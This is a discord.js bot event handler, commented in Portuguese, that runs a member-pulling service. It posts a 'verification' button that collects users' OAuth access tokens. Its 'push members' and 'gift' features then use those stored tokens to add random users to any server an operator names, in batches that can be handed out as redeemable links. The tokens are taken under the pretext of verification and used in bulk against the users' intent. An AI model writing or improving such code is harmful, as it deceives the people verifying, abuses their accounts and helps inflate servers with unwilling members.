const { 
    Events, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle, 
    ActionRowBuilder,
    EmbedBuilder,
    ButtonBuilder,
    ButtonStyle,
    ChannelType
} = require('discord.js');
const { dbWrapper } = require('../../database/database.js');
const { v4: uuidv4 } = require('uuid');
const { clientId, redirectUri, scopes, baseUrl } = require('../../../config.js');
const botClient = require('../index.js'); // Importa o cliente do bot

module.exports = {
	name: Events.InteractionCreate,
	async execute(interaction) {

        // --- TRATAMENTO DE COMANDOS (/) ---
        if (interaction.isChatInputCommand()) {
            const command = interaction.client.commands.get(interaction.commandName);
            if (!command) {
                console.error(`Nenhum comando correspondente a ${interaction.commandName} foi encontrado.`);
                return;
            }

            try {
                await command.execute(interaction);
            } catch (error) {
                console.error(`Houve um erro no COMANDO ${interaction.commandName}`);
                console.error(error);
                
                // Correção de Erro 10062 (Interação Expirada)
                if (error.code === 10062) {
                    console.warn("Erro 10062 (Comando): A interação expirou (cold start?). Ignorando resposta.");
                    return;
                }

                try {
                    if (interaction.replied || interaction.deferred) {
                        await interaction.followUp({ content: 'Houve um erro ao executar esse comando!', flags: 64 });
                    } else {
                        await interaction.reply({ content: 'Houve um erro ao executar esse comando!', flags: 64 });
                    }
                } catch (replyError) {
                    if (replyError.code !== 10062) {
                        console.error("Falha ao enviar a MENSAGEM DE ERRO para o usuário:", replyError);
                    }
                }
            }
            return; // Encerra aqui se for comando
        }

        // --- TRATAMENTO DE BOTÕES ---
        if (interaction.isButton()) {
            
            try {
                // Lógica para 'Puxar Membros'
                if (interaction.customId === 'push_members_button') {
                    const totalUsers = await dbWrapper.getTotalUsers();
                    
                    const modal = new ModalBuilder()
                        .setCustomId('push_members_modal')
                        .setTitle('Solicitação de Push');
                    
                    const guildIdInput = new TextInputBuilder()
                        .setCustomId('guild_id_input')
                        .setLabel('QUAL ID DO SERVIDOR DESEJA PUXAR?')
                        .setPlaceholder('Ex: 1248555742370205...')
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true);

                    const amountInput = new TextInputBuilder()
                        .setCustomId('amount_input')
                        .setLabel('QUAL QUANTIDADE DESEJA PUXAR?')
                        .setPlaceholder(`Usuários disponíveis: ${totalUsers}`)
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true);

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(guildIdInput),
                        new ActionRowBuilder().addComponents(amountInput)
                    );

                    await interaction.showModal(modal);
                }

                // Lógica para 'Configurar Servidores'
                if (interaction.customId === 'config_server_button') {
                    const config = await dbWrapper.getBotConfig();
                    
                    const modal = new ModalBuilder()
                        .setCustomId('config_server_modal')
                        .setTitle('Configurar Servidores e Logs');

                    const mainGuildInput = new TextInputBuilder()
                        .setCustomId('main_guild_input')
                        .setLabel('ID do Servidor Principal')
                        .setStyle(TextInputStyle.Short)
                        .setValue(config?.mainGuildId || '')
                        .setPlaceholder('ID do seu servidor principal')
                        .setRequired(false);
                    
                    const verifiedRoleInput = new TextInputBuilder()
                        .setCustomId('verified_role_input')
                        .setLabel('ID do Cargo Verificado')
                        .setStyle(TextInputStyle.Short)
                        .setValue(config?.verifiedRoleId || '')
                        .setPlaceholder('ID do cargo de verificado')
                        .setRequired(false);
                    
                    const logsWebhookInput = new TextInputBuilder()
                        .setCustomId('logs_webhook_input')
                        .setLabel('URL do Webhook de Logs')
                        .setStyle(TextInputStyle.Short)
                        .setValue(config?.logsWebhookUrl || '')
                        .setPlaceholder('https://discord.com/api/webhooks/...')
                        .setRequired(false);

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(mainGuildInput),
                        new ActionRowBuilder().addComponents(verifiedRoleInput),
                        new ActionRowBuilder().addComponents(logsWebhookInput)
                    );

                    await interaction.showModal(modal);
                }

                // Lógica para 'Criar Gift'
                if (interaction.customId === 'create_gift_button') {
                    const totalUsers = await dbWrapper.getTotalUsers();

                    const modal = new ModalBuilder()
                        .setCustomId('create_gift_modal')
                        .setTitle('Gerar Gifts Members');

                    const memberCountInput = new TextInputBuilder()
                        .setCustomId('member_count_input')
                        .setLabel('QUANTIDADE DE MEMBROS ESSE GIFT TERÁ?')
                        .setStyle(TextInputStyle.Short)
                        .setPlaceholder(`Lembre-se: ${totalUsers} Membro(s) disponíveis.`)
                        .setRequired(true);

                    const giftAmountInput = new TextInputBuilder()
                        .setCustomId('gift_amount_input')
                        .setLabel('QUANTOS GIFT(S) QUER GERAR?')
                        .setStyle(TextInputStyle.Short)
                        .setPlaceholder('Exemplo: 3')
                        .setValue('1') // Padrão
                        .setRequired(true);
                    
                    modal.addComponents(
                        new ActionRowBuilder().addComponents(memberCountInput),
                        new ActionRowBuilder().addComponents(giftAmountInput)
                    );

                    await interaction.showModal(modal);
                }

                // Lógica para 'Enviar Mensagem Auth'
                if (interaction.customId === 'send_embed_button') {
                    const config = await dbWrapper.getEmbedConfig();

                    const modal = new ModalBuilder()
                        .setCustomId('send_embed_modal')
                        .setTitle('Configurar Mensagem de Verificação');

                    const titleInput = new TextInputBuilder().setCustomId('embed_title_input').setLabel('Título da Embed').setStyle(TextInputStyle.Short).setValue(config.title).setRequired(true);
                    const descInput = new TextInputBuilder().setCustomId('embed_desc_input').setLabel('Descrição (use \\n para nova linha)').setStyle(TextInputStyle.Paragraph).setValue(config.description.replace(/\n/g, '\\n')).setRequired(true);
                    const colorInput = new TextInputBuilder().setCustomId('embed_color_input').setLabel('Cor (Hex ex: #5865F2)').setStyle(TextInputStyle.Short).setValue(typeof config.color === 'number' ? `#${config.color.toString(16).padStart(6, '0')}` : config.color).setRequired(true);
                    const buttonInput = new TextInputBuilder().setCustomId('embed_button_input').setLabel('Texto do Botão').setStyle(TextInputStyle.Short).setValue(config.buttonLabel).setRequired(true);
                    const channelInput = new TextInputBuilder().setCustomId('embed_channel_input').setLabel('ID do Canal para enviar').setStyle(TextInputStyle.Short).setPlaceholder('ID do canal onde a mensagem será enviada').setRequired(true);

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(titleInput),
                        new ActionRowBuilder().addComponents(descInput),
                        new ActionRowBuilder().addComponents(colorInput),
                        new ActionRowBuilder().addComponents(buttonInput),
                        new ActionRowBuilder().addComponents(channelInput)
                    );

                    await interaction.showModal(modal);
                }

            } catch (error) {
                console.error(`Houve um erro no BOTÃO ${interaction.customId}`);
                console.error(error);
                
                if (error.code === 10062) {
                    console.warn("Erro 10062 (Botão): A interação expirou. Ignorando resposta.");
                    return;
                }
                
                try {
                    if (interaction.replied || interaction.deferred) {
                        await interaction.followUp({ content: 'Houve um erro ao processar sua solicitação!', flags: 64 });
                    } else {
                        await interaction.reply({ content: 'Houve um erro ao processar sua solicitação!', flags: 64 });
                    }
                } catch (replyError) {
                    if (replyError.code !== 10062) {
                        console.error("Falha ao enviar a MENSAGEM DE ERRO (Botão):", replyError);
                    }
                }
            }
            return; // Encerra aqui se for botão
        }

        // --- TRATAMENTO DE MODAIS ---
        if (interaction.isModalSubmit()) {

            try {
                // Lógica do Modal 'Puxar Membros'
                if (interaction.customId === 'push_members_modal') {
                    await interaction.deferReply({ flags: 64 });
                    
                    const guildId = interaction.fields.getTextInputValue('guild_id_input');
                    const amountStr = interaction.fields.getTextInputValue('amount_input');
                    const amount = parseInt(amountStr);
                    const totalUsers = await dbWrapper.getTotalUsers();

                    if (isNaN(amount) || amount <= 0) {
                        return interaction.editReply({ content: 'A quantidade de membros deve ser um número válido e maior que zero.' });
                    }
                    if (amount > totalUsers) {
                        return interaction.editReply({ content: `Você não pode puxar ${amount} membros. Você só tem ${totalUsers} usuários válidos.` });
                    }

                    // Verifica se o bot está no servidor
                    let guild;
                    try {
                        guild = await botClient.guilds.fetch(guildId);
                    } catch {
                        return interaction.editReply({ content: 'ID de servidor inválido ou o bot não está nele.' });
                    }

                    await interaction.editReply({ content: `Iniciando pull de ${amount} membros para \`${guild.name}\`. Isso pode demorar...\n*Não use este comando novamente até que o processo seja concluído.*` });

                    // Pega usuários aleatórios do DB
                    const usersToPull = await dbWrapper.getRandomUsers(amount);
                    let successCount = 0;
                    let failCount = 0;

                    for (const user of usersToPull) {
                        try {
                            // Tenta adicionar o membro usando o access token
                            await guild.members.add(user.discordId, {
                                accessToken: user.accessToken
                            });
                            successCount++;
                        } catch (error) {
                            failCount++;
                            console.warn(`Falha ao puxar ${user.username} (ID: ${user.discordId}): ${error.message}`);
                        }
                    }

                    await interaction.followUp({ 
                        content: `Pull para \`${guild.name}\` concluído!\n\n` +
                                 `✅ **Sucesso:** ${successCount} membros\n` +
                                 `❌ **Falhas:** ${failCount} membros (provavelmente tokens expirados ou banidos)`,
                        flags: 64 
                    });
                }

                // Lógica do Modal 'Configurar Servidores'
                if (interaction.customId === 'config_server_modal') {
                    await interaction.deferReply({ flags: 64 });
                    
                    const mainGuildId = interaction.fields.getTextInputValue('main_guild_input') || null;
                    const verifiedRoleId = interaction.fields.getTextInputValue('verified_role_input') || null;
                    const logsWebhookUrl = interaction.fields.getTextInputValue('logs_webhook_input') || null;

                    await dbWrapper.saveBotConfig({ mainGuildId, verifiedRoleId, logsWebhookUrl });

                    await interaction.editReply({ content: 'Configurações do servidor salvas com sucesso!' });
                }

                // Lógica do Modal 'Criar Gift'
                if (interaction.customId === 'create_gift_modal') {
                    await interaction.deferReply({ flags: 64 });
                    
                    const memberCountStr = interaction.fields.getTextInputValue('member_count_input');
                    const giftAmountStr = interaction.fields.getTextInputValue('gift_amount_input');
                    const memberCount = parseInt(memberCountStr);
                    const giftAmount = parseInt(giftAmountStr);
                    const totalUsers = await dbWrapper.getTotalUsers();

                    if (isNaN(memberCount) || isNaN(giftAmount) || memberCount <= 0 || giftAmount <= 0) {
                        return interaction.editReply({ content: 'Valores devem ser números válidos e maiores que zero.' });
                    }
                    if (memberCount > totalUsers) {
                        return interaction.editReply({ content: `Você não pode criar gifts de ${memberCount} membros. Você só tem ${totalUsers} usuários válidos.` });
                    }
                    if (giftAmount > 20) {
                        return interaction.editReply({ content: 'Você só pode gerar 20 gifts por vez.' });
                    }

                    const generatedCodes = [];
                    for (let i = 0; i < giftAmount; i++) {
                        const code = uuidv4(); // Gera um código único
                        await dbWrapper.createGift(code, memberCount);
                        generatedCodes.push(`${baseUrl}/redeem/redeem/${code}`); // Usa a rota da página web
                    }

                    // Envia os links na DM do usuário
                    try {
                        const dmChannel = await interaction.user.createDM();
                        // Quebra a mensagem se for muito longa
                        const chunks = [];
                        let currentChunk = `**Gifts Gerados (Membros: ${memberCount})**\n`;
                        for (const code of generatedCodes) {
                            if (currentChunk.length + code.length + 2 > 2000) {
                                chunks.push(currentChunk);
                                currentChunk = "";
                            }
                            currentChunk += code + '\n';
                        }
                        chunks.push(currentChunk);
                        
                        for (const chunk of chunks) {
                            await dmChannel.send(chunk);
                        }
                        
                        await interaction.editReply({ content: `Sucesso! Enviei ${giftAmount} link(s) de gift para sua DM.` });

                    } catch (error) {
                        console.error("Erro ao enviar DM de gift:", error);
                        await interaction.editReply({ content: 'Não foi possível enviar os links para sua DM. Você está com as DMs fechadas?' });
                    }
                }

                // Lógica do Modal 'Enviar Mensagem Auth'
                if (interaction.customId === 'send_embed_modal') {
                    await interaction.deferReply({ flags: 64 });

                    const title = interaction.fields.getTextInputValue('embed_title_input');
                    const description = interaction.fields.getTextInputValue('embed_desc_input').replace(/\\n/g, '\n');
                    const colorStr = interaction.fields.getTextInputValue('embed_color_input');
                    const buttonLabel = interaction.fields.getTextInputValue('embed_button_input');
                    const channelId = interaction.fields.getTextInputValue('embed_channel_input');
                    
                    const color = parseInt(colorStr.replace('#', ''), 16);
                    if (isNaN(color)) {
                        return interaction.editReply({ content: 'Cor inválida. Use o formato Hex (ex: #5865F2).' });
                    }

                    // Salva a config do embed no DB
                    await dbWrapper.saveEmbedConfig({ title, description, color, buttonLabel });

                    // Pega o canal
                    let channel;
                    try {
                        channel = await botClient.channels.fetch(channelId);
                        if (!channel || channel.type !== ChannelType.GuildText) {
                            throw new Error('Canal não é de texto.');
                        }
                    } catch {
                        return interaction.editReply({ content: 'ID de canal inválido ou não é um canal de texto.' });
                    }

                    // Gera um 'state' único para este botão de verificação
                    // Usamos o ID do Guild como parte do state para saber de onde veio
                    const state = uuidv4();
                    await dbWrapper.saveAuthState(state, '@everyone', interaction.guildId); // State genérico para o botão

                    const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scopes.join(' '))}&state=${state}`;

                    const embed = new EmbedBuilder()
                        .setTitle(title)
                        .setDescription(description)
                        .setColor(color)
                        .setTimestamp();
                    
                    const button = new ButtonBuilder()
                        .setLabel(buttonLabel)
                        .setURL(oauthUrl)
                        .setStyle(ButtonStyle.Link)
                        .setEmoji('✅');
                    
                    const row = new ActionRowBuilder().addComponents(button);

                    try {
                        await channel.send({ embeds: [embed], components: [row] });
                        await interaction.editReply({ content: `Mensagem de verificação enviada para ${channel}!` });
                    } catch (error) {
                        console.error("Erro ao enviar mensagem no canal:", error);
                        await interaction.editReply({ content: 'Erro ao enviar mensagem. Verifique minhas permissões no canal.' });
                    }
                }

            } catch (error) {
                console.error(`Houve um erro no MODAL ${interaction.customId}`);
                console.error(error);
                
                if (error.code === 10062) {
                    console.warn("Erro 10062 (Modal): A interação expirou. Ignorando resposta.");
                    return;
                }

                try {
                    if (interaction.replied || interaction.deferred) {
                        await interaction.followUp({ content: 'Houve um erro ao processar sua solicitação!', flags: 64 });
                    } else {
                        await interaction.reply({ content: 'Houve um erro ao processar sua solicitação!', flags: 64 });
                    }
                } catch (replyError) {
                    if (replyError.code !== 10062) {
                        console.error("Falha ao enviar a MENSAGEM DE ERRO (Modal):", replyError);
                    }
                }
            }
            return; // Encerra aqui se for modal
        }
	},
};